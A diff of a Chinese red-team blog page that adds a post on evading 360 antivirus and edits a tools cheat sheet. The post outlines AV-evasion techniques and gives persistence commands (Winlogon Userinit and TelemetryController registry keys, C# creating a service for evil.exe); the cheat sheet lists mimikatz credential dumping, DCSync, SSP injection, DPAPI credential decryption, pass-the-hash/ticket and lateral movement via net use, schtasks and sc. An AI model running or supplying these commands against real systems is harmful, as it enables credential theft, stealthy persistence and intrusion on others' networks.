@@ -261,6 +261,274 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2021/01/04/关于杀软对抗的议题拓展/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/01/04/关于杀软对抗的议题拓展/" itemprop="url">关于CIS"杀软对抗"的议题拓展</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-04T00:00:01+08:00">
+                2021-01-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/C/" itemprop="url" rel="index">
+                    <span itemprop="name">C</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="关于”杀软对抗”的议题拓展"><a href="#关于”杀软对抗”的议题拓展" class="headerlink" title="关于”杀软对抗”的议题拓展"></a>关于”杀软对抗”的议题拓展</h1><blockquote>
+<p>本文章作为CIS网络安全创新大会议题 <strong>Redteaming：主流杀软对抗之路</strong> 的扩展与延伸，从<strong>为什么</strong>出发，到杀软规则的测试与讨论.</p>
+</blockquote>
+<h2 id="CIS议题重点"><a href="#CIS议题重点" class="headerlink" title="CIS议题重点"></a>CIS议题重点</h2><ul>
+<li>shellcode加密</li>
+</ul>
+<blockquote>
+<p>针对杀软于shellcode的静态二进制特征查杀，用加密解决shellcode的静态特征。</p>
+</blockquote>
+<ul>
+<li>IAT导入地址表</li>
+</ul>
+<blockquote>
+<p>针对杀软对PE文件的IAT导入表的敏感函数检测，使用动态调用的技巧，完成隐藏导入函数的效果。</p>
+</blockquote>
+<ul>
+<li>混淆编译</li>
+</ul>
+<blockquote>
+<p>针对杀软对特征字符串和函数执行流程的检测，使用编译时混淆字符串和函数调用混淆的办法，隐藏特征字符串，和使用有限状态机的函数执行。</p>
+</blockquote>
+<ul>
+<li>API执行链</li>
+</ul>
+<blockquote>
+<p>针对基于启发式扫描的API执行链检测，使用巨大的内存分配与填充，干扰API执行链，具有行为免杀的效果。</p>
+</blockquote>
+<ul>
+<li>强延时</li>
+</ul>
+<blockquote>
+<p>针对杀软和沙箱的时间加速，使用模拟计算来实现一个强延时，具有无视时间加速和一定的反沙箱效果。</p>
+</blockquote>
+<ul>
+<li>系统调用</li>
+</ul>
+<blockquote>
+<p>针对杀软及EDR的用户态HOOK，使用本地加载并映射ntdll.dll技巧来实现动态系统调用，解决系统调用的兼容性问题，完成对挂钩函数的脱钩。</p>
+</blockquote>
+<h2 id="为什么讲这几点？"><a href="#为什么讲这几点？" class="headerlink" title="为什么讲这几点？"></a>为什么讲这几点？</h2><blockquote>
+<p>在我看来，bypass杀软和bypass waf是一样的，需要见招拆招，各种技巧思路都应具有针对性，比如我在CIS中的讲的各点，其实只是一些常规操作，但是它都针对了杀软检测规则的一部分，从而具有目的性的完成想要的效果：bypass。</p>
+</blockquote>
+<p> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2021/01/04/%E5%85%B3%E4%BA%8E%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97%E7%9A%84%E8%AE%AE%E9%A2%98%E6%8B%93%E5%B1%95/1.png" alt="avatar"></p>
+<h2 id="了解杀软检测规则"><a href="#了解杀软检测规则" class="headerlink" title="了解杀软检测规则"></a>了解杀软检测规则</h2><blockquote>
+<p>举个例子（利用规则）</p>
+<ul>
+<li><p>360安全卫士对于自启动的拦截十分严格，但是问题在于，自启动是正常的系统行为，为什么QQ加自启动不会被拦截？</p>
+<p> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2021/01/04/%E5%85%B3%E4%BA%8E%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97%E7%9A%84%E8%AE%AE%E9%A2%98%E6%8B%93%E5%B1%95/3.png" alt="avatar"></p>
+<ul>
+<li><p>答案大家应该也知道，因为QQ带有高信誉的签名。（那么我们能不能利用这一点呢？）</p>
+<p> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2021/01/04/%E5%85%B3%E4%BA%8E%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97%E7%9A%84%E8%AE%AE%E9%A2%98%E6%8B%93%E5%B1%95/2.png" alt="avatar"></p>
+</li>
+<li><p>答案当然是可以的，我们如果能找到一个QQ的DLL劫持，QQ会加载被劫持的恶意DLL，然后恶意的DLL将会为我们添加自启动，于是就利用带有腾讯签名的进程（QQ.exe）,为我们添加自启动.</p>
+</li>
+<li><p>在今年更新360 13前，这个玩法都是有效的，那么为什么现在失效了。</p>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2021/01/04/%E5%85%B3%E4%BA%8E%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97%E7%9A%84%E8%AE%AE%E9%A2%98%E6%8B%93%E5%B1%95/5.png" alt="avatar"></p>
+</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>这里使用的是360浏览器的一个dll劫持，带有360的签名，但是在最新版360的检测下，由于加载的DLL无签名，又因为这个DLL产生了高危的行为（添加自启动），于是此DLL被定义为恶意文件。</p>
+</blockquote>
+<p> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2021/01/04/%E5%85%B3%E4%BA%8E%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97%E7%9A%84%E8%AE%AE%E9%A2%98%E6%8B%93%E5%B1%95/4.png" alt="avatar"></p>
+<blockquote>
+<p>通过利用规则，我在这里利用了360对签名进程的高信誉证书的信任，完成了启动项的添加。</p>
+</blockquote>
+<p><strong>再举个例子（绕过规则）</strong></p>
+<ul>
+<li>使用360所不知道，不在拦截名单中的自启动，也能达成添加自启动的目的。</li>
+</ul>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; reg add <span class="string">"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"</span> <span class="string">/v</span> Userinit <span class="string">/d</span> <span class="string">"Userinit.exe, evil.exe"</span> <span class="string">/f</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>这个自启动注册表，于去年年底公开，然后存活了一个月。</p>
+</blockquote>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; reg add "HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\A</span>ppCompatFlags<span class="symbol">\T</span>elemetryController<span class="symbol">\t</span>est" /v Command /d c:<span class="symbol">\\</span>windows<span class="symbol">\\</span>system32<span class="symbol">\\</span>notepad.exe</span><br><span class="line">&gt; reg add "HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\A</span>ppCompatFlags<span class="symbol">\T</span>elemetryController<span class="symbol">\t</span>est" /v Nightly  /t REG_DWORD /d 1</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>遥测，这是个Windows的自启动计划任务，于今年上半年爆出，一个月后失效</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> using System;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> using System.Collections.Generic;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> using System.Linq;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> using System.Text;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> using System.Management.Automation;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> using System.Collections.ObjectModel;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> public class Program</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> &#123;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 	public static void Main()</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 	&#123;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		PowerShell ps1 = PowerShell.Create();</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		ps1.AddScript(<span class="string">"new-service –Name OrderService –DisplayName OrderService –BinaryPathName c:/evil.exe  –StartupType Automatic;Start-Service OrderService"</span>);</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		ps1.Invoke();</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		PowerShell ps2 = PowerShell.Create();</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		ps2.AddCommand(<span class="string">"Get-Process"</span>);</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		Collection&lt;PSObject&gt; PSOutput = ps2.Invoke();</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		foreach (PSObject outputItem <span class="keyword">in</span> PSOutput)</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		&#123;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 			<span class="keyword">if</span> (outputItem != null)</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 			&#123;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 				Console.WriteLine(outputItem);</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 			&#125;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		&#125;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 		</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 	&#125;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> &#125;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<blockquote>
+<p>这个是我自己发现的，在去年讨论使用.net实现powershell被禁用的环境下执行powershell的技巧时，我就尝试过用这种技巧去添加自启动，于今年年初失效。</p>
+</blockquote>
+</blockquote>
+<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><blockquote>
+<p>由我的观察可得出</p>
+<p>360安全卫士的拦截规则其实非常死板，完全基于签名与黑名单，添加黑名单中的启动项时，需要检查进程签名，启动项所对应的启动程序也需要检查签名，现在被加载的dll也要检查签名。</p>
+<p>进程可信 +  启动项对应对象可信 + dll可信（如果是dll的启动项添加行为） =  添加通过。</p>
+</blockquote>
+<blockquote>
+<ul>
+<li><p>利用规则</p>
+<ul>
+<li><p>即利用对高信誉签名的信任，可以完成任意启动项的添加。</p>
+<blockquote>
+<p>优点：灵活，可以直接完成绝大部分行为的bypass</p>
+<p>缺点：难找，难利用。</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>绕过规则</p>
+<ul>
+<li><p>绕过规则中的黑名单添加项or添加方式。</p>
+<blockquote>
+<p>优点：比较容易寻找并利用，通过研究注册表功能及一些隐藏项，即可找到黑名单外的启动项。</p>
+<p>缺点：启动方式单一，技巧容易被捕获。</p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>很不幸，今天讲的技巧都已经无效，但是我希望的是，读者能从这些bypass案例中，寻找到bypass的思路，</p>
+<p>我前端时间发过一个视频，可以任意添加注册表和服务，就是通过系统机制完成的对微软签名的滥用，即使360更新到了13，同样也一样能bypass，</p>
+<p><a href="https://www.bilibili.com/video/BV14t4y1i7aX/" target="_blank" rel="noopener">https://www.bilibili.com/video/BV14t4y1i7aX/</a></p>
+</blockquote>
+</blockquote>
+
+          
+        
+      
+    </div>
+    
+    
+    
+    <div>
+          
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2020/07/01/hw工具/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -357,7 +625,7 @@
             <h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><p>开源密码抓取工具</p>
 <p>抓密码，hash传递</p>
 <p><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
-<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#手动</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line">lsadump::dcsync /domain:pentestlab.local /all /csv  全域</span><br><span class="line">#一句话</span><br><span class="line">mimikatz.exe pass</span><br><span class="line">#通过注册表开启Windows明文密码记录（2012及以上默认抓不到明文密码）</span><br><span class="line">mimikatz.exe reg</span><br><span class="line">#内存注入实现明文记录到文本，需再次登录，重启无效（有蓝屏风险）</span><br><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br><span class="line">type C:<span class="symbol">\W</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\m</span>imilsa.log</span><br><span class="line">#dll+注册表，永久性密码记录到文本，</span><br><span class="line">copy mimilib.dll <span class="variable">%systemroot%</span><span class="symbol">\s</span>ystem32</span><br><span class="line">reg query hklm<span class="symbol">\s</span>ystem<span class="symbol">\c</span>urrentcontrolset<span class="symbol">\c</span>ontrol<span class="symbol">\l</span>sa<span class="symbol">\ </span>/v "Security Packages"</span><br><span class="line">reg add hklm<span class="symbol">\s</span>ystem<span class="symbol">\c</span>urrentcontrolset<span class="symbol">\c</span>ontrol<span class="symbol">\l</span>sa<span class="symbol">\ </span>/v "Security Packages" /d "kerberos<span class="symbol">\0</span>msv1_0<span class="symbol">\0</span>schannel<span class="symbol">\0</span>wdigest<span class="symbol">\0</span>tspkg<span class="symbol">\0</span>pku2u<span class="symbol">\0</span>mimilib" /t REG_MULTI_SZ</span><br><span class="line">type C:<span class="symbol">\W</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\k</span>iwissp.log</span><br><span class="line"></span><br><span class="line">#获取winodws保存的本地rdp凭证</span><br><span class="line">dir /a <span class="variable">%userprofile%</span><span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\*</span></span><br><span class="line">privilege::debug</span><br><span class="line">dpapi::cred /in:C:<span class="symbol">\U</span>sers<span class="symbol">\k</span>ering<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\D</span>FBE70A7E5CC19A398EBF1B96859CE5D</span><br><span class="line">sekurlsa::dpapi</span><br><span class="line">dpapi::cred /in:C:<span class="symbol">\U</span>sers<span class="symbol">\k</span>ering<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\D</span>FBE70A7E5CC19A398EBF1B96859CE5D /masterkey:6ccd15632f9354e9fa30a2656bbf193985aa4568876fc9e4b35d72159b79f3d312c4a5b5327272b0328d833aadba7f4d156a976286588ab4bf58f85dbb73e4fe</span><br><span class="line"></span><br><span class="line">#传递</span><br><span class="line">sekurlsa::pth /user:xxxxxxx /domain:xxxxxxx /ntlm:xxxxxxxxxxxx  #hash传递</span><br><span class="line">sekurlsa::pth /user:xxxxxxx /domain:xxxxxxx /aes256:xxxxxxxxxxxxxx  #key传递</span><br><span class="line">sekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the user's ntlm hash&gt; /run:"mstsc.exe /restrictedadmin"</span><br><span class="line">#凭据</span><br><span class="line">kerberos::purge  //清空当前机器所有凭证</span><br><span class="line">Kerberos::list //查看当前机器凭证</span><br><span class="line">kerberos::ptc TGT_admin@cgn.com.ccache //将票据注入到进程中</span><br></pre></td></tr></table></figure>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#手动</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line">lsadump::dcsync /domain:pentestlab.local /all /csv  全域</span><br><span class="line">#一句话</span><br><span class="line">mimikatz.exe pass</span><br><span class="line">#通过注册表开启Windows明文密码记录（2012及以上默认抓不到明文密码）</span><br><span class="line">mimikatz.exe reg</span><br><span class="line">#内存注入实现明文记录到文本，需再次登录，重启无效（有蓝屏风险）</span><br><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br><span class="line">type C:<span class="symbol">\W</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\m</span>imilsa.log</span><br><span class="line">#dll+注册表，永久性密码记录到文本，</span><br><span class="line">copy mimilib.dll <span class="variable">%systemroot%</span><span class="symbol">\s</span>ystem32</span><br><span class="line">reg query hklm<span class="symbol">\s</span>ystem<span class="symbol">\c</span>urrentcontrolset<span class="symbol">\c</span>ontrol<span class="symbol">\l</span>sa<span class="symbol">\ </span>/v "Security Packages"</span><br><span class="line">reg add hklm<span class="symbol">\s</span>ystem<span class="symbol">\c</span>urrentcontrolset<span class="symbol">\c</span>ontrol<span class="symbol">\l</span>sa<span class="symbol">\ </span>/v "Security Packages" /d "kerberos<span class="symbol">\0</span>msv1_0<span class="symbol">\0</span>schannel<span class="symbol">\0</span>wdigest<span class="symbol">\0</span>tspkg<span class="symbol">\0</span>pku2u<span class="symbol">\0</span>mimilib" /t REG_MULTI_SZ</span><br><span class="line">type C:<span class="symbol">\W</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\k</span>iwissp.log</span><br><span class="line"></span><br><span class="line">#获取winodws保存的本地rdp凭证</span><br><span class="line">dir /a <span class="variable">%userprofile%</span><span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\*</span></span><br><span class="line">privilege::debug</span><br><span class="line">dpapi::cred /in:C:<span class="symbol">\U</span>sers<span class="symbol">\k</span>ering<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\D</span>FBE70A7E5CC19A398EBF1B96859CE5D</span><br><span class="line">sekurlsa::dpapi</span><br><span class="line">dpapi::cred /in:C:<span class="symbol">\U</span>sers<span class="symbol">\k</span>ering<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\D</span>FBE70A7E5CC19A398EBF1B96859CE5D /masterkey:6ccd15632f9354e9fa30a2656bbf193985aa4568876fc9e4b35d72159b79f3d312c4a5b5327272b0328d833aadba7f4d156a976286588ab4bf58f85dbb73e4fe</span><br><span class="line"></span><br><span class="line">#传递</span><br><span class="line">sekurlsa::pth /user:xxxxxxx /domain:xxxxxxx /ntlm:xxxxxxxxxxxx  #hash传递</span><br><span class="line">sekurlsa::pth /user:xxxxxxx /domain:xxxxxxx /aes256:xxxxxxxxxxxxxx  #key传递</span><br><span class="line">sekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the user's ntlm hash&gt; /run:"mstsc.exe /restrictedadmin"</span><br><span class="line">kerberos::ptt [0;862bdd]-2-0-60a10000-DM2012$@krbtgt-TEST.LOCAL.kirbi</span><br><span class="line">#凭据</span><br><span class="line">kerberos::purge  //清空当前机器所有凭证</span><br><span class="line">Kerberos::list //查看当前机器凭证</span><br><span class="line">kerberos::ptc TGT_admin@cgn.com.ccache //将票据注入到进程中</span><br></pre></td></tr></table></figure>
 
 <p><img src="C:%5CUsers%5Cwin10%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200611162558603.png" alt="image-20200611162558603"></p>
 <h3 id="mimikatz-ptt-net-use-schtasks-横向"><a href="#mimikatz-ptt-net-use-schtasks-横向" class="headerlink" title="mimikatz ptt + net use + schtasks 横向"></a>mimikatz ptt + net use + schtasks 横向</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">传递</span><br><span class="line">sekurlsa::pth /user:xxxxxxx /domain:xxxxxxx /ntlm:xxxxxxxxxxxx  #hash传递</span><br><span class="line">挂载</span><br><span class="line">net use \\192.168.14.131\C$</span><br><span class="line">测试文件传输</span><br><span class="line">copy 1.txt \\192.168.14.131\C$</span><br><span class="line">创建计划任务<span class="keyword">or</span>服务修改<span class="keyword">or</span>服务创建</span><br><span class="line">schtasks /S \\192.168.14.131\ /create /RU<span class="built_in"> SYSTEM </span>/RL HIGHEST /F /tn <span class="string">"SysDebug"</span> /tr <span class="string">"C:\windows\SysDebug.exe"</span> /sc DAILY /mo 1 /ST 11:05</span><br><span class="line">sc \\test-win7t<span class="built_in"> config </span>a2 binpath= <span class="string">"c:\cqooc.exe"</span> start= auto</span><br><span class="line">sc \\test-win7t create a2 binpath= <span class="string">"c:\calc.exe"</span> start= auto</span><br><span class="line">密码转hash</span><br><span class="line">Rubeus.exe hash /user:evilsystem /password:evil /domain:test.local</span><br></pre></td></tr></table></figure>
@@ -366,7 +634,7 @@
 <p><img src="C:%5CUsers%5Cwin10%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200624005306055.png" alt="image-20200624005306055"></p>
 <h3 id="Hash-rdp"><a href="#Hash-rdp" class="headerlink" title="Hash rdp"></a>Hash rdp</h3><p>如果目标使用“受限管理模式”，即可通过hash远程桌面（默认关闭）。</p>
 <p>可以通过注册表开启。</p>
-<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">利用hash注入凭据到mstsc程序。默认情况会登录失败</span><br><span class="line"><span class="symbol">sekurlsa:</span>:pth /user:<span class="params">&lt;user name&gt;</span> /domain:<span class="params">&lt;domain name&gt;</span> /ntlm:<span class="params">&lt;the user's ntlm hash&gt;</span> /run:<span class="string">"mstsc.exe /restrictedadmin"</span></span><br><span class="line">以目标凭据启动powershell</span><br><span class="line">mimikatz.exe <span class="string">"sekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the user's ntlm hash&gt; /run:powershell.exe"</span></span><br><span class="line">获取目标powershell（需要开启winrm服务（服务器默认开启），且凭据用户拥有目标管理员权限）target值应为目标主机名</span><br><span class="line">Enter-PSSession -Computer <span class="params">&lt;Target&gt;</span></span><br><span class="line">这里也可能视为手动winrm横向,流量无法通过代理,cs的横向payload见杀软就没了，这样反而更加有效</span><br><span class="line">修改注册表开启受限管理员模式</span><br><span class="line">New-ItemProperty -Path <span class="string">"HKLM:\System\CurrentControlSet\Control\Lsa"</span> -Name <span class="string">"DisableRestrictedAdmin"</span> -Value <span class="string">"0"</span> -PropertyType DWORD -Force</span><br></pre></td></tr></table></figure>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">利用hash注入凭据到mstsc程序。默认情况会登录失败</span><br><span class="line">sekurlsa:<span class="function">:pth</span> <span class="string">/user</span>:&lt;user name&gt; <span class="string">/domain</span>:&lt;domain name&gt; <span class="string">/ntlm</span>:&lt;the user's ntlm hash&gt; <span class="string">/run</span>:<span class="string">"mstsc.exe /restrictedadmin"</span></span><br><span class="line">以目标凭据启动powershell</span><br><span class="line">mimikatz.exe <span class="string">"sekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the user's ntlm hash&gt; /run:powershell.exe"</span></span><br><span class="line">获取目标powershell（需要开启winrm服务（服务器默认开启），且凭据用户拥有目标管理员权限）target值应为目标主机名</span><br><span class="line">Enter-PSSession -Computer &lt;Target&gt;</span><br><span class="line">winrm quickconfig -q</span><br><span class="line">sc start winrm</span><br><span class="line">这里也可能视为手动winrm横向,流量无法通过代理,cs的横向payload见杀软就没了，这样反而更加有效</span><br><span class="line">修改注册表开启受限管理员模式</span><br><span class="line">New-ItemProperty -Path <span class="string">"HKLM:\System\CurrentControlSet\Control\Lsa"</span> -Name <span class="string">"DisableRestrictedAdmin"</span> -Value <span class="string">"0"</span> -PropertyType DWORD -Force</span><br><span class="line"></span><br><span class="line">REG ADD HKLM\System\CurrentControlSet\Control\Lsa <span class="string">/v</span> DisableRestrictedAdmin <span class="string">/t</span> REG_DWORD <span class="string">/d</span> 00000000 <span class="string">/f</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="C:%5CUsers%5Cwin10%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200627173707061.png" alt="image-20200627173707061"></p>
 <h2 id="ServerScan"><a href="#ServerScan" class="headerlink" title="ServerScan"></a>ServerScan</h2><p>开源单文件端口扫描器（跨平台）</p>
@@ -385,7 +653,7 @@
 
 <h2 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h2><p>票据操控工具，只能域环境使用</p>
 <p><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
